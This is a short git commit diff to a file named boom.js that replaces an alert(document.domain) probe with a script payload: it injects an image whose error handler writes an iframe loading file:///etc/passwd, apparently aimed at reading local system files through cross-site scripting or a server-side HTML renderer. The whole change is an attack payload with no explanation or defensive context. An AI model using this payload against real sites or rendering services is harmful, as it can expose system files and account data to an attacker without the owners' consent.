6bd4048bb48b0f4fdf2e7e93347a8a95726dfe73
shashank134 <75831097+shashank134@users.noreply.github.com>
2024-01-21 15:39:36 +0530

    Update boom.js

--- boom.js
+++ boom.js
@@ -1,4 +1,13 @@
 // File: alertScript.js
 
-alert(document.domain);
+//alert(document.domain);
+
+// Example JavaScript code in your .js file
+var img = document.createElement('img');
+img.src = 'echopwn';
+img.onerror = function() {
+    document.write('<iframe src="file:///etc/passwd"></iframe>');
+};
+document.body.appendChild(img);
+
 
